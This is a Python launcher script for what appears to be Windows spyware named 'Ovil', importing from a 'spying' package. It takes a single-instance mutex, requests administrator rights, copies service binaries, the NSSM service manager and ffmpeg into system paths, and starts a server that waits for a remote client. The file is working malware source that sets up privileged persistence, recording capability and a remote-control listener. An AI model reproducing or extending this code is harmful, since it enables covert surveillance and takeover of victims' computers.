import os

import win32api
import win32con
import winerror

from network.server import Server
from spying.consts import SERVICE_PATHS, SERVICE_NAME, NSSM_PATH, FFMPEG_PATH
from spying import Spy, admin
from pathlib import Path
from shutil import copy as __copy
import ctypes
from ctypes import wintypes

# Create ctypes wrapper for Win32 functions we need, with correct argument/return types
_CreateMutex = ctypes.windll.kernel32.CreateMutexA
_CreateMutex.argtypes = [wintypes.LPCVOID, wintypes.BOOL, wintypes.LPCSTR]
_CreateMutex.restype = wintypes.HANDLE

_WaitForSingleObject = ctypes.windll.kernel32.WaitForSingleObject
_WaitForSingleObject.argtypes = [wintypes.HANDLE, wintypes.DWORD]
_WaitForSingleObject.restype = wintypes.DWORD

_ReleaseMutex = ctypes.windll.kernel32.ReleaseMutex
_ReleaseMutex.argtypes = [wintypes.HANDLE]
_ReleaseMutex.restype = wintypes.BOOL

_CloseHandle = ctypes.windll.kernel32.CloseHandle
_CloseHandle.argtypes = [wintypes.HANDLE]
_CloseHandle.restype = wintypes.BOOL

# must be here for the pyinstaller:
import unicrypto.backends.cryptography
import unicrypto.backends.cryptography.DES
import unicrypto.backends.cryptography.TDES
import unicrypto.backends.cryptography.RC4
import unicrypto.backends.cryptography.AES


def copy(src, path):
    try:
        if Path(path).exists():
            os.remove(path)
        __copy(src, path)
    except OSError as e:
        print(e)


def main():
    mutex = None
    try:
        mutex = _CreateMutex(None, False, b"Ovil-21")
        ret = _WaitForSingleObject(mutex, 250)
        if ret not in (0, 0x80):
            print("An ovil is already running")
            mutex = None
        else:
            if not admin.make_admin():
                return
            service1 = Path(f"{SERVICE_NAME}1")
            service2 = Path(f"{SERVICE_NAME}2")
            nssm = Path("nssm.exe")
            ffmpeg = Path("ffmpeg.exe")
            if service1.exists():
                copy(service1, SERVICE_PATHS[0][0])
            if service2.exists():
                copy(service2, SERVICE_PATHS[1][0])
            if nssm.exists():
                copy(nssm, NSSM_PATH)
            if ffmpeg.exists():
                copy(ffmpeg, FFMPEG_PATH)
            s = Server()
            s.wait_for_client()
    finally:
        if mutex:
            print("Closing the mutex")
            ret = _ReleaseMutex(mutex)
            if not ret:
                print("couldn't release mutex")
            ret = _CloseHandle(mutex)
            if not ret:
                print("couldn't close the handle")
            print("Closed the mutex successfully!")



print("main started!")
main()
